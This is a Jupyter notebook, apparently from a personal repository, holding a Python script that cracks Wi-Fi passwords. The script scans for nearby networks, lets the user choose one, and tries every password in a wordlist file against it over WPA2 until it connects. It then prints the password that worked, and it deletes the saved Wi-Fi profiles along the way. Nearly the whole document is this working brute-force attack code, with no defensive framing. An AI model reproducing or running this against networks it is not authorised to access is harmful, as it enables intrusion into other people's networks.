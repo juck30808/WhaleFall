{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "66f39570",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "from pywifi import const\n",
    "import time\n",
    "import inquirer\n",
    "\n",
    "def connect(name,password):\n",
    "    interface = pywifi.PyWiFi().interfaces()[0]\n",
    "    interface.disconnect()                       # disconnect now\n",
    "    time.sleep(1)\n",
    "    if interface.status() == const.IFACE_DISCONNECTED:\n",
    "        prof = pywifi.Profile()\n",
    "        prof.ssid = name                            # wifi ssid(wifi名稱)\n",
    "        prof.key = password                         # wifi psw\n",
    "        prof.akm.append(const.AKM_TYPE_WPA2PSK)     # wifi type\n",
    "        prof.auth = const.AUTH_ALG_OPEN #           # 網卡的開放\n",
    "        prof.cipher = const.CIPHER_TYPE_CCMP        # 加密單元\n",
    "        interface.remove_all_network_profiles()     # 刪除所有的wifi文件\n",
    "        tep_prof = interface.add_network_profile(prof)\n",
    "        interface.connect(tep_prof)                 # connect new wifi\n",
    "        time.sleep(1)\n",
    "        if interface.status() == const.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "def main():\n",
    "    file = open(\"input/password.txt\",'r')    # drictionary\n",
    "    wifis = []\n",
    "    iface = pywifi.PyWiFi().interfaces()[0]  # scan\n",
    "    res = iface.scan_results()\n",
    "    for i, prof in enumerate(res):\n",
    "        wifis.append(prof.ssid)\n",
    "    questions = [inquirer.List('wifi', message = \"Choose Wifi List\", choices = wifis),]\n",
    "    answers = inquirer.prompt(questions)\n",
    "    curr_name = answers['wifi']\n",
    "        \n",
    "    while 1:\n",
    "        curr_pwd = file.readline()\n",
    "        try:\n",
    "            status = connect(curr_name,curr_pwd)\n",
    "            if status:\n",
    "                print(\"Psw:\"+curr_pwd)\n",
    "                break\n",
    "            else:\n",
    "                print(\"Wrong:%s\"%curr_pwd)\n",
    "        except:\n",
    "            continue\n",
    "    file.close()\n",
    "if __name__=='__main__':\n",
    "\tmain()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
